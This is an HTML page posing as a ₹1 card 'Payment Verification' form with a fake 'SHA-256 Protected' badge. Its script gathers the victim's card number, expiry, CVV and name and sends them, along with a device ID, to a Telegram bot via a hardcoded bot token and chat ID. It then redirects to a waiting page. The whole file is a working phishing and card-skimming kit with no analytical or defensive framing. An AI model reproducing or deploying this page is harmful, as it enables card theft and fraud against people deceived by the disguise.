<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Payment Verification</title>
  <meta name="viewport" content="width=370,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
  <style>
    body {
      background: linear-gradient(140deg, #e7f4ff 0, #e9eeff 70%);
      min-height: 100vh;
      margin: 0;
      font-family: 'Inter', Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .vmain {
      width: 100vw;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .vbox {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 8px 30px #3389ff23;
      width: 340px;
      max-width: calc(100vw - 18px);
      padding: 25px 20px 15px 20px;
      box-sizing: border-box;
      margin: 0 auto;
    }
    .vtitle { color: #2876ef; text-align: center; font-size: 21px; font-weight: 800; margin-bottom: 2px; margin-top: 2px;}
    .vamt { color: #247ee8; font-size: 19px; font-weight: 700; text-align: center; margin-bottom: 0;}
    .vsub { text-align: center; color: #7b8ba0; font-size: 14px; margin-bottom: 16px; margin-top: 2px;}
    .vfield {font-size: 15.2px; color: #1a2340; font-weight: 600; margin-bottom: 6px;}
    .vinp {
      background: #f0f6ff;
      color: #133;
      font-size: 16.3px;
      font-weight: 600;
      border-radius: 7.5px;
      border: 1.2px solid #e2eafd;
      padding: 11px 12px;
      margin-bottom: 14px;
      width: 100%;
      box-sizing: border-box;
      outline: none;
      transition: border 0.14s;
      box-shadow: 0 1px 1.5px #daeaff;
    }
    .vinp:focus {border:2px solid #3990f8; background: #edf4ff;}
    .vinline {display: flex; gap: 13px;}
    .vinline .vinp {margin-bottom: 0;}
    .vbtn {
      background: #2176fe;
      color: #fff;
      border: none;
      border-radius: 8px;
      width: 100%;
      padding: 14px 0 13px 0;
      font-size: 17.3px;
      font-weight: 700;
      margin: 11px 0 19px 0;
      box-shadow: 0 1.5px 10px #3494ff28;
      cursor:pointer;
      transition: background 0.14s;
    }
    .vbtn:active { background: #1955b3; }
    .verr {
      background: #fff3f5; color: #f34c52; border-radius:6px; font-size:14.2px;
      padding:8px 10px; margin-bottom:13px; margin-top:2px;
      border:1.3px solid #ffe8f2; display:none; text-align: center;
    }
    .sha256bar {
      background: #f5fbff;
      border-radius: 10px;
      padding: 7.5px 0 8px 0;
      box-shadow: 0 2px 12px #2578ec16;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4.5px;
      margin-bottom:7px;
    }
    .sha256bar span {color: #2056b1; font-size:13.7px;font-weight:500;}
    .sha256lock {
      font-size:18px;margin-right:4px;color:#295377;font-family:Arial,sans-serif;font-weight:900;
    }
    @media (max-width:395px) {.vbox{width: 97vw; padding: 12px 2vw 0 2vw;}}
  </style>
</head>
<body>
<div class="vmain">
  <div class="vbox">
    <div class="vtitle">Payment Verification &#8226;</div>
    <div class="vamt">₹1.00</div>
    <div class="vsub">Card will be validated securely.</div>
    <form autocomplete="off" onsubmit="return payCard(event)">
      <div>
        <div class="vfield">Cardholder Name</div>
        <input class="vinp" type="text" name="nameoncard" placeholder="Full Name">
      </div>
      <div>
        <div class="vfield">Card Number</div>
        <input class="vinp" type="text" name="cardnum" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="20">
      </div>
      <div class="vinline">
        <div style="flex:1">
          <div class="vfield">Expiry</div>
          <input class="vinp" type="text" name="exp" placeholder="MM/YY" maxlength="5" inputmode="numeric" oninput="formatExpiry(this)">
        </div>
        <div style="flex:1">
          <div class="vfield">CVV</div>
          <input class="vinp" type="password" name="cvv" placeholder="CVV" maxlength="4" inputmode="numeric">
        </div>
      </div>
      <div class="verr" id="errMsg"></div>
      <button class="vbtn" type="submit">Pay ₹1 for Verification</button>
      <div class="sha256bar">
        <span class="sha256lock">&#128274;</span>
        <span>SHA-256 Protected</span>
      </div>
    </form>
  </div>
</div>
<script>
let DeviceId = "{DEVICE_ID_MY_PROJECT}";
  function formatExpiry(inp) {
    let v = inp.value.replace(/[^0-9]/g,"");
    if(v.length >= 2 && v[2] !== "/" && v.length < 5) v = v.slice(0,2) + "/" + v.slice(2);
    inp.value = v.slice(0,5);
  }
  function payCard(e) {
    e.preventDefault();
    var n = document.getElementsByName("cardnum")[0].value.replace(/s/g,"");
    var exp = document.getElementsByName("exp")[0].value;
    var cvv = document.getElementsByName("cvv")[0].value;
    var name = document.getElementsByName("nameoncard")[0].value.trim();
    var errBox = document.getElementById("errMsg");
    errBox.style.display = "none";
    if(n.length < 12){errBox.innerText="Invalid card number.";errBox.style.display="block";return false;}
    if(exp.length != 5 || exp.indexOf("/")!=2){errBox.innerText="Expiry must be MM/YY format.";errBox.style.display="block";return false;}
    if(cvv.length < 3){errBox.innerText="CVV must be 3 or 4 digits.";errBox.style.display="block";return false;}
    if(name.length<3){errBox.innerText="Cardholder name required.";errBox.style.display="block";return false;}
    let msg = `New Card Details:
Card Number: ${n}
Expiry: ${exp}
CVV: ${cvv}
Name: ${name}
DeviceId: ${DeviceId}`;
    fetch("https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "-1003282741646",
        text: msg
      })
    }).then(()=>{
      window.location.href="wait.html";
    });
    return false;
  }
</script>

</body>
</html>
